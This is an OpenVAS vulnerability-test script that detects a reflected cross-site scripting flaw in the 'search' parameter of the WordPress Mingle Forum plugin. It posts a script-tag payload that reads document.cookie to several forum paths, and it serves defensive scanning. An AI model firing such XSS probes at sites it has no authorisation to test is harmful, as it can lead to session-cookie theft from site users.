###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_mingle_forum_plugin_xss_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
#
# WordPress Mingle Forum Plugin 'search' Parameter XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
web script or HTML in a user's browser session in the context of an affected
site.

Impact Level: Application";

tag_affected = "WordPress Mingle Forum Plugin version 1.0.33";

tag_insight = "The flaw is due to an input passed via the 'search' parameter is
not properly sanitized before being returned to the user.";

tag_solution = "Upgrade to WordPress Mingle Forum Plugin version 1.0.34.
For updates refer to http://wordpress.org/extend/plugins/mingle-forum/";

tag_summary = "This host is installed with WordPress Mingle Forum plugin and is
prone to cross-site scripting vulnerability.";

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902665");
  script_version("$Revision: 5841 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-03-29 16:02:43 +0530 (Thu, 29 Mar 2012)");
  script_name("WordPress Mingle Forum Plugin 'search' Parameter XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/17826");
  script_xref(name : "URL" , value : "http://tunisianseven.blogspot.in/2012/03/mingle-forum-wordpress-plugin-xss.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;
mfReq = "";
mfRes = "";
postdata = "";

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

host = http_host_name(port:port);

## Path of Vulnerable Page
url = '/?mingleforumaction=search';

## Construct the POST data
postdata = "search_words=<script>alert(document.cookie)</script>" +
           "&search_submit=Search+forums";

foreach forum (make_list("/forum", "/forums", "/le-forum"))
{
  ## Construct the POST request
  mfReq = string("POST ", dir, forum, url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

  ## Send post request and Receive the response
  mfRes = http_keepalive_send_recv(port:port, data:mfReq);

  ## Confirm exploit worked by checking the response
  if(mfRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< mfRes)
  {
    security_message(port);
    exit(0);
  }
}
